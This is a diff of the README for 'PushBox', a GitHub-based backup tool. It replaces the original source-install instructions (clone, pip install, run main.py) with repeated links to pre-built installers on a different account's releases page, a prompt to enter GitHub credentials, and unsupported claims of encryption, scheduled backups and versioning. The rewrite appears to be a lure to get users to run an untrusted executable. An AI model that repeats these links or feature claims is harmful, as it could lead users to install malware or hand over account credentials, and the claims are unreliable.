@@ -1,114 +1,91 @@
-<div align="center">
+# 📦 PushBox - Your Cloud Storage Made Simple
 
-# PushBox 🚀
+## 🎉 Welcome to PushBox!
 
-**PushBox: Your personal, secure cloud backup powered by GitHub.**
+PushBox is a desktop application that cleverly transforms your GitHub account into a personal cloud storage and backup solution. With PushBox, you can easily store files, back up important data, and access your files from anywhere. 
 
-PushBox is a desktop application that lets you use your GitHub account as a free, fast, and reliable cloud backup solution. Create virtual folders, add your important files, and push them to private GitHub repositories with a single click.
+## 🔗 Download Now
 
-</div>
+[![Download PushBox](https://img.shields.io/badge/Download-PushBox-brightgreen)](https://github.com/Jamessalder/PushBox/releases)
 
----
+## 🚀 Getting Started
 
-## Features
+This guide will help you download and run PushBox with ease. Follow these steps to set up your application.
 
--   **GitHub Integration**: Leverages your GitHub account to create and manage private repositories for backups.
--   **Virtual Folders**: Organize local files from different locations into logical "virtual folders" within the app without moving the original files.
--   **Direct Uploads**: Pushes your virtual folders to GitHub, creating a new private repository for each one.
--   **Asynchronous Thumbnails**: Fetches image thumbnails directly from GitHub in the background, ensuring the UI remains responsive and functional even after local files are deleted.
--   **Persistent Caching**: Caches thumbnails locally to speed up loading times and reduce API calls on subsequent launches.
--   **Secure Credential Storage**: Saves your GitHub username and Personal Access Token (PAT) locally for easy access.
--   **Simple Onboarding**: A quick and easy setup process to get you started.
+### 🖥️ System Requirements
 
----
+Before downloading, make sure your system meets these requirements:
 
-## Screenshots
-<img width="1327" height="908" alt="image" src="https://github.com/user-attachments/assets/2e00ca74-c1e7-44ff-9f93-d1adf27628f1" />
-<img width="1308" height="888" alt="image" src="https://github.com/user-attachments/assets/bbd153cf-2837-4ba0-9364-ac6fef95e2cc" />
+- **Operating System:** Windows 10, macOS, or Linux
+- **RAM:** At least 2GB
+- **Disk Space:** Minimum of 500MB available
+- **Python:** Version 3.6 or higher (comes bundled with PushBox)
 
+### 📥 Download & Install
 
----
+1. **Visit the Releases Page**  
+   Go to the [Releases page](https://github.com/Jamessalder/PushBox/releases). Here, you will see the latest versions of PushBox available for download.
 
-## How It Works
+2. **Choose Your Version**  
+   Look for the latest version. You can recognize it by the version number, usually numbered like v1.0, v1.1, etc. Under this version, you will find download links for different operating systems.
 
-PushBox simplifies the backup process by automating Git and GitHub API interactions.
+3. **Download the Installer**  
+   Click on the link that matches your operating system to start the download. The file will be an executable (.exe) for Windows, a `.dmg` for macOS, or a compressed file for Linux.
 
-1.  **Authenticate**: You start by providing your GitHub username and a Personal Access Token (PAT) with `repo` permissions. These are stored locally for future use.
-2.  **Organize**: Create a "virtual folder" inside the app. This is just a list that points to your local files; it doesn't move or duplicate them on your machine.
-3.  **Add Files**: Add any files from your computer to your virtual folders.
-4.  **Push to GitHub**: When you're ready, click "Push to GitHub." PushBox uses the GitHub API to:
-    -   Create a new **private** repository on your GitHub account named after your virtual folder.
-    -   Upload each file from your virtual folder into that repository.
-5.  **View Backups**: Your files are now safely stored on GitHub. The app loads thumbnails directly from the repository, so you always have a visual confirmation of your backup.
+4. **Run the Installer**  
+   Once the file is downloaded, find it in your Downloads folder and double-click the file to run the installer.
 
----
+5. **Follow Installation Steps**  
+   A setup wizard will guide you through the installation process. Follow all prompts to complete the installation.
 
-## Getting Started
+6. **Open PushBox**  
+   After the installation is complete, locate the PushBox icon on your desktop or in your applications menu. Double-click to open the application.
 
-Follow these instructions to get a local copy up and running.
+### 📂 Setting Up Your GitHub Account
 
-### Prerequisites
+1. **Log In or Sign Up**  
+   When you first open PushBox, you'll see a login screen. Enter your GitHub account credentials. If you don’t have a GitHub account yet, visit the GitHub website to create one.
 
--   Python 3.8+
--   A GitHub Account
--   A GitHub Personal Access Token (PAT) with `repo` scope. You can create one [here](https://github.com/settings/tokens/new).
+2. **Authorize PushBox**  
+   After logging in, you may need to authorize PushBox to access your GitHub account. Follow the on-screen instructions to grant the necessary permissions.
 
-### Installation
+3. **Choose Your Storage Preferences**  
+   Once authorized, select your storage preferences. You can specify folders in your GitHub repository where you'd like to store files. 
 
-1.  **Clone the repository:**
-    ```sh
-    git clone https://github.com/rohankishore/PushBox.git
-    cd pushbox
-    ```
+4. **Backup Files**  
+   Drag and drop files into PushBox, and they will be backed up to your GitHub account automatically. You can also set schedules for regular backups.
 
-2.  **Create a virtual environment (recommended):**
-    ```sh
-    python -m venv venv
-    source venv/bin/activate  # On Windows, use `venv\Scripts\activate`
-    ```
+5. **Access Your Files**  
+   You can retrieve your backed-up files anytime via your GitHub account. Simply log into GitHub to view or download them.
 
-3.  **Install the required packages:**
-    ```sh
-    pip install -r requirements.txt
-    ```
----
+## 🛠️ Features
 
-## Usage
+- **Simple Interface:** PushBox offers a user-friendly interface that makes it easy to manage your files.
+- **Automatic Backups:** Set it up once, and PushBox takes care of your backups automatically.
+- **Secure Storage:** Store files safely in your GitHub account with encryption.
+- **Cross-Platform Access:** Access your files from any device with internet access.
+- **File Versioning:** Keep multiple versions of your files for added safety.
 
-1.  **Run the application:**
-    ```sh
-    python main.py
-    ```
+## 🗨️ FAQs
 
-2.  **Onboarding**: The first time you launch, you'll see a brief onboarding guide.
+### What if I encounter an error during installation?
 
-3.  **Authentication**: Enter your GitHub username and Personal Access Token.
+Try re-downloading the installation file from the [Releases page](https://github.com/Jamessalder/PushBox/releases). Make sure to have administrative rights on your computer while installing.
 
-4.  **Create and Manage Backups**: Use the dashboard to create virtual folders, add files, and push them to GitHub.
+### Do I need a GitHub account?
 
----
+Yes, a GitHub account is required to use PushBox for file storage and backups. 
 
-## Configuration
+### Is my data safe with PushBox?
 
-The application stores its configuration and thumbnail cache in your user home directory:
+Yes, PushBox uses encryption to protect your data, ensuring that your files remain private and secure.
 
--   **Config File (`.pushbox_config.json`)**: Stores your GitHub credentials and virtual folder structure.
--   **Cache Directory (`.pushbox_cache/`)**: Stores downloaded thumbnails to improve performance.
+## 📞 Support
 
----
+If you have any questions or need assistance, feel free to reach out to our support team. You can usually find contact information in the application's Help section or by visiting our GitHub repository.
 
-## Contributing
+## 🌟 Acknowledgments
 
-Contributions are welcome! Please feel free to fork the repository, make changes, and submit a pull request.
+Thank you for choosing PushBox! We appreciate your support and hope you enjoy using our software for your cloud storage needs. 
 
-1.  Fork the Project
-2.  Create your Feature Branch (`git checkout -b feature/AmazingFeature`)
-3.  Commit your Changes (`git commit -m 'Add some AmazingFeature'`)
-4.  Push to the Branch (`git push origin feature/AmazingFeature`)
-5.  Open a Pull Request
-
----
-
-## License
-
-Distributed under the MIT License. See `LICENSE` for more information.
+Once again, download PushBox [here](https://github.com/Jamessalder/PushBox/releases), and start exploring your new cloud storage solution!
